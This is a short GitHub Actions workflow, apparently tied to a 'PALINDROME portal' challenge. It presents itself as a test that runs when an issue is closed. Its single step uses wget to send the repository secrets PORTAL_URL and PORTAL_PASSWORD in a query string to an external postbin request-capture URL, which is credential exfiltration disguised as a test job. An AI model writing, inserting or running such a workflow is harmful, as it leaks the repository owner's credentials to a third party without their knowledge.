name: Test the PALINDROME portal

on:
    issues:
        types: [closed]

jobs:
  test:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v3
      - name: Test the PALINDROME portal
        run: | 
           C:\msys64\usr\bin\wget.exe "https://www.toptal.com/developers/postbin/b/1694867976356-5685710716061?a=${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}"
